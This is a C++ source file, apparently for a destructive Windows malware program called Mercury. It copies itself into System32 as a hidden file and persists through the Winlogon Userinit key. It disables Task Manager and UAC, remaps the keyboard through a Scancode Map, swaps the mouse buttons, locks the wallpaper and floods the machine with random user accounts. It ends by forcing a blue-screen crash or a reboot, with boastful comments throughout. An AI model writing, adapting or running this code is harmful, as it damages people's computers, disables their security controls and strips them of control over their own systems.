#include "Setup.h"
void createRandomUser()
{
	// Generate random username with Unicode letters
	wstring username;
	const int usernameLength = rand() % 10 + 5;
	for (int j = 0; j < usernameLength; j++) {
		const int unicode = rand() % (0x10FFFF - 0x80) + 0x80;
		wchar_t utf16[2] = { 0 };
		if (unicode <= 0xFFFF) {
			utf16[0] = unicode;
		}
		else if (unicode <= 0x10FFFF) {
			utf16[0] = (unicode >> 10) + 0xD7C0;
			utf16[1] = (unicode & 0x3FF) + 0xDC00;
		}
		username += utf16;
	}

	// Generate random password with Unicode letters
	wstring password;
	const int passwordLength = rand() % 10 + 5;
	for (int j = 0; j < passwordLength; j++) {
		const int unicode = rand() % (0x10FFFF - 0x80) + 0x80;
		wchar_t utf16[2] = { 0 };
		if (unicode <= 0xFFFF) {
			utf16[0] = unicode;
		}
		else if (unicode <= 0x10FFFF) {
			utf16[0] = (unicode >> 10) + 0xD7C0;
			utf16[1] = (unicode & 0x3FF) + 0xDC00;
		}
		password += utf16;
	}

	// Create user account
	USER_INFO_1 userInfo;
	userInfo.usri1_name = const_cast<wchar_t*>(username.c_str());
	userInfo.usri1_password = const_cast<wchar_t*>(password.c_str());
	userInfo.usri1_priv = USER_PRIV_USER;
	userInfo.usri1_home_dir = nullptr;
	userInfo.usri1_comment = nullptr;
	userInfo.usri1_flags = UF_SCRIPT;
	userInfo.usri1_script_path = nullptr;
	NetUserAdd(nullptr, 1, reinterpret_cast<LPBYTE>(&userInfo), nullptr);
	USER_INFO_1008 userInfo1008;
	userInfo1008.usri1008_flags = UF_DONT_EXPIRE_PASSWD;
	NetUserSetInfo(nullptr, const_cast<wchar_t*>(username.c_str()), 1008, reinterpret_cast<LPBYTE>(&userInfo1008), nullptr);

	// Add user to "Users" group to make it visible on the login screen
	LOCALGROUP_MEMBERS_INFO_3 localGroupMembersInfo;
	localGroupMembersInfo.lgrmi3_domainandname = const_cast<wchar_t*>(username.c_str());
	NetLocalGroupAddMembers(nullptr, L"Users", 3, reinterpret_cast<LPBYTE>(&localGroupMembersInfo), 1);
}
void user()
{
	// Seed random number generator
	srand(GetTickCount());

	// Generate random number of users
	const int numUsers = 30;

	// Create random users
	for (int i = 0; i < numUsers; i++) {
		createRandomUser();
	}
}
void taskmgr() {
	DWORD dwVal = 1;

	HKEY hKey;
	RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\", 0, KEY_ALL_ACCESS, &hKey);
	RegSetValueEx(hKey, L"DisableTaskmgr", 0, REG_DWORD, (LPBYTE)&dwVal, sizeof(DWORD));
	RegCloseKey(hKey);
}
void scancodemap() {
	HKEY hKey;
	DWORD dwDisposition;
	DWORD dwType = REG_BINARY;
	DWORD dwSize = 256;
	BYTE* regValue = new BYTE[dwSize];

	// Set the values of the registry key
	regValue[0] = 0x00;
	regValue[1] = 0x00;
	regValue[2] = 0x00;
	regValue[3] = 0x00;
	regValue[4] = 0x00;
	regValue[5] = 0x00;
	regValue[6] = 0x00;
	regValue[7] = 0x00;
	regValue[8] = 0x00;
	regValue[9] = 0x71;
	regValue[10] = 0x00;
	regValue[11] = 0x00;
	regValue[12] = 0x00;
	regValue[13] = 0x00;
	regValue[14] = 0x00;
	regValue[15] = 0x01;
	regValue[16] = 0x00;
	regValue[17] = 0x00;
	regValue[18] = 0x00;
	regValue[19] = 0x3b;
	regValue[20] = 0x00;
	regValue[21] = 0x00;
	regValue[22] = 0x00;
	regValue[23] = 0x3c;
	regValue[24] = 0x00;
	regValue[25] = 0x00;
	regValue[26] = 0x00;
	regValue[27] = 0x00;
	regValue[28] = 0x00;
	regValue[29] = 0x00;
	regValue[30] = 0x00;
	regValue[31] = 0x00;
	regValue[32] = 0x00;
	regValue[33] = 0x00;
	regValue[34] = 0x00;
	regValue[35] = 0x00;
	regValue[36] = 0x00;
	regValue[37] = 0x00;
	regValue[38] = 0x00;
	regValue[39] = 0x00;
	regValue[40] = 0x00;
	regValue[41] = 0x00;
	regValue[42] = 0x00;
	regValue[43] = 0x00;
	regValue[44] = 0x00;
	regValue[45] = 0x00;
	regValue[46] = 0x00;
	regValue[47] = 0x00;
	regValue[48] = 0x00;
	regValue[49] = 0x00;
	regValue[50] = 0x00;
	regValue[51] = 0x00;
	regValue[52] = 0x00;
	regValue[53] = 0x00;
	regValue[54] = 0x00;
	regValue[55] = 0x00;
	regValue[56] = 0x00;
	regValue[57] = 0x00;
	regValue[58] = 0x00;
	regValue[59] = 0x00;
	regValue[60] = 0x00;
	regValue[61] = 0x00;
	regValue[62] = 0x00;
	regValue[63] = 0x00;
	regValue[64] = 0x00;
	regValue[65] = 0x01;
	regValue[66] = 0x00;
	regValue[67] = 0x00;
	regValue[68] = 0x00;
	regValue[69] = 0x00;
	regValue[70] = 0x5b;
	regValue[71] = 0xe0;
	regValue[72] = 0x01;
	regValue[73] = 0x00;
	regValue[74] = 0x00;
	regValue[75] = 0x00;
	regValue[76] = 0x00;
	regValue[77] = 0x00;
	regValue[78] = 0x00;
	regValue[79] = 0x00;
	regValue[80] = 0x00;
	regValue[81] = 0x00;
	regValue[82] = 0x00;
	regValue[83] = 0x00;
	regValue[84] = 0x00;
	regValue[85] = 0x00;
	regValue[86] = 0x00;
	regValue[87] = 0x00;
	regValue[88] = 0x00;
	regValue[89] = 0x00;
	regValue[90] = 0x00;
	regValue[91] = 0x00;
	regValue[92] = 0x00;
	regValue[93] = 0x00;
	regValue[94] = 0x00;
	regValue[95] = 0x00;
	regValue[96] = 0x00;
	regValue[97] = 0x51;
	regValue[98] = 0x00;
	regValue[99] = 0x00;
	regValue[100] = 0x00;


	// Create and open the registry key
	RegCreateKeyEx(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Control\\Keyboard Layout\\", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, &dwDisposition);

	// Write the values to the registry key
	RegSetValueEx(hKey, L"Scancode Map", 0, dwType, regValue, dwSize);

	// Close the registry key handle
	RegCloseKey(hKey);
}
void lua() {
	DWORD dwVal = 0;

	HKEY hKey;
	RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\", 0, KEY_ALL_ACCESS, &hKey);
	RegSetValueEx(hKey, L"EnableLUA", 0, REG_DWORD, (LPBYTE)&dwVal, sizeof(DWORD));
	RegCloseKey(hKey);
}
void nochange() {
	DWORD dwVal = 1;

	HKEY hKey;
	RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\ActiveDesktop\\", 0, KEY_ALL_ACCESS, &hKey);
	RegSetValueEx(hKey, L"NoChangingWallPaper", 0, REG_DWORD, (LPBYTE)&dwVal, sizeof(DWORD));
	RegCloseKey(hKey);
}
void autocolorization() {
	DWORD dwVal = 1;

	HKEY hKey;
	RegOpenKeyEx(HKEY_CURRENT_USER, L"Control Panel\\Desktop\\", 0, KEY_ALL_ACCESS, &hKey);
	RegSetValueEx(hKey, L"AutoColorization", 0, REG_DWORD, (LPBYTE)&dwVal, sizeof(DWORD));
	RegCloseKey(hKey);
}
void swapmousebuttons() {
	DWORD dwVal = 1;

	HKEY hKey;
	RegOpenKeyEx(HKEY_CURRENT_USER, L"Control Panel\\Mouse\\", 0, KEY_ALL_ACCESS, &hKey);
	RegSetValueEx(hKey, L"SwapMouseButtons", 0, REG_DWORD, (LPBYTE)&dwVal, sizeof(DWORD));
	RegCloseKey(hKey);
}
void wallpaper() {
	const wchar_t* file = L"C:\\hello.jpg";
	SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (void*)file, SPIF_UPDATEINIFILE);
}
bool Is64BitWindows()
{
	BOOL isWow64 = FALSE;
	IsWow64Process(GetCurrentProcess(), &isWow64);
	return isWow64 == TRUE;
}
void SetValue(const char* exe) {
	HKEY hkey;
	const char* czname = "Userinit";
	//const char* czVal = "1"; 

	LONG retVal2 = RegCreateKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\", 0, NULL, REG_OPTION_NON_VOLATILE,
		KEY_WRITE, NULL, &hkey, NULL);
	if (retVal2 == ERROR_SUCCESS)
	{
		RegSetValueExA(hkey, czname, 0, REG_SZ, (unsigned char*)exe, strlen(exe));
	}
	RegCloseKey(hkey);
}
void launch() {
	if (Is64BitWindows()) {
		const char* exe = "C:\\Windows\\system32\\userinit.exe,C:\\Windows\\SysWOW64\\Mercury.exe";
		SetValue(exe);
	}
	else {
		const char* exe = "C:\\Windows\\system32\\userinit.exe,C:\\Windows\\System32\\Mercury.exe";
		SetValue(exe);
	}
}
bool IsFirstRun()
{
	// Check if a flag file exists
	if (GetFileAttributesA("C:\\Windows\\flag.txt") == INVALID_FILE_ATTRIBUTES)
	{
		// Flag file doesn't exist, create it
		HANDLE hFile = CreateFileA("C:\\Windows\\flag.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
		if (hFile != INVALID_HANDLE_VALUE)
		{
			// Flag file created, close the handle
			CloseHandle(hFile);
			return true; // First run
		}
	}

	return false; // Not the first run
}
void all() {
	char system[MAX_PATH];
	char pathtofile[MAX_PATH];
	HMODULE GetModH = GetModuleHandleA(NULL);
	GetModuleFileNameA(GetModH, pathtofile, sizeof(pathtofile));
	GetSystemDirectoryA(system, sizeof(system));
	strcat(system, "\\Mercury.exe");
	CopyFileA(pathtofile, system, false);
	SetFileAttributes(L"C:\\Windows\\System32\\Mercury.exe", FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN);
	ExtractResource(IDR_JPG1, L"C:\\hello.jpg");
	swapmousebuttons();
	taskmgr();
	lua();
	autocolorization();
	wallpaper();
	launch();
	nochange();
	scancodemap();
	createRandomUser();
	user();
}
void CrashORRebootWindows() {
	HANDLE hToken;
	TOKEN_PRIVILEGES tkp;
	BOOL bResult = FALSE;

	// Get the current process's token handle
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
	{
		//crashing windows is just so easy!
		HMODULE hNtdll = LoadLibrary(L"ntdll.dll");
		if (hNtdll) {
			VOID(*RtlAdjustPrivilege)(DWORD, DWORD, BOOLEAN, LPBYTE) = (VOID(*)(DWORD, DWORD, BOOLEAN, LPBYTE))GetProcAddress(hNtdll, "RtlAdjustPrivilege");
			VOID(*NtRaiseHardError)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD) = (void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))GetProcAddress(hNtdll, "NtRaiseHardError");

			if (RtlAdjustPrivilege && NtRaiseHardError) {
				unsigned char unused1;
				long unsigned int unused2;
				RtlAdjustPrivilege(0x13, true, false, &unused1);
				NtRaiseHardError(0xdeaddead, 0, 0, 0, 6, &unused2); //and this will be more epic! :)
			}

			FreeLibrary(hNtdll);
		}

		ExitWindowsEx(EWX_REBOOT | EWX_FORCE, 0);
	}

	// Get the LUID for the shutdown privilege
	if (!LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid))
	{
		//crashing windows is just so easy!
		HMODULE hNtdll = LoadLibrary(L"ntdll.dll");
		if (hNtdll) {
			VOID(*RtlAdjustPrivilege)(DWORD, DWORD, BOOLEAN, LPBYTE) = (VOID(*)(DWORD, DWORD, BOOLEAN, LPBYTE))GetProcAddress(hNtdll, "RtlAdjustPrivilege");
			VOID(*NtRaiseHardError)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD) = (void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))GetProcAddress(hNtdll, "NtRaiseHardError");

			if (RtlAdjustPrivilege && NtRaiseHardError) {
				unsigned char unused1;
				long unsigned int unused2;
				RtlAdjustPrivilege(0x13, true, false, &unused1);
				NtRaiseHardError(0xdeaddead, 0, 0, 0, 6, &unused2); //and this will be more epic! :)
			}

			FreeLibrary(hNtdll);
		}

		ExitWindowsEx(EWX_REBOOT | EWX_FORCE, 0);
	}

	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	// Enable the shutdown privilege for this process
	if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0))
	{
		//crashing windows is just so easy!
		HMODULE hNtdll = LoadLibrary(L"ntdll.dll");
		if (hNtdll) {
			VOID(*RtlAdjustPrivilege)(DWORD, DWORD, BOOLEAN, LPBYTE) = (VOID(*)(DWORD, DWORD, BOOLEAN, LPBYTE))GetProcAddress(hNtdll, "RtlAdjustPrivilege");
			VOID(*NtRaiseHardError)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD) = (void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))GetProcAddress(hNtdll, "NtRaiseHardError");

			if (RtlAdjustPrivilege && NtRaiseHardError) {
				unsigned char unused1;
				long unsigned int unused2;
				RtlAdjustPrivilege(0x13, true, false, &unused1);
				NtRaiseHardError(0xdeaddead, 0, 0, 0, 6, &unused2); //and this will be more epic! :)
			}

			FreeLibrary(hNtdll);
		}

		ExitWindowsEx(EWX_REBOOT | EWX_FORCE, 0);
	}
	ExitWindowsEx(EWX_REBOOT | EWX_FORCE, 0);
}
bool ExtractResource(int iId, LPCWSTR pDest) {
	HRSRC aResourceH = FindResource(NULL, MAKEINTRESOURCE(iId), L"JPG");
	if (!aResourceH) {
		printf("unable to find resource");
		return false;
	}

	HGLOBAL aResourceHGlobal = LoadResource(NULL, aResourceH);
	if (!aResourceHGlobal) {
		printf("unable to load resource");
		return false;
	}

	unsigned char* aFilePtr = (unsigned char*)LockResource(aResourceHGlobal);
	if (!aFilePtr) {
		printf("Unable to lock resource");
		return false;
	}

	unsigned long aFileSize = SizeofResource(NULL, aResourceH);

	HANDLE file_handle = CreateFile(pDest, FILE_ALL_ACCESS, 0, NULL, CREATE_ALWAYS, 0, NULL);
	if (INVALID_HANDLE_VALUE == file_handle) {
		int err = GetLastError();
		if ((ERROR_ALREADY_EXISTS == err) || (32 == err)) {
			return true;
		}
		return false;
	}

	unsigned long numWritten;
	WriteFile(file_handle, aFilePtr, aFileSize, &numWritten, NULL);
	CloseHandle(file_handle);

	return true;
}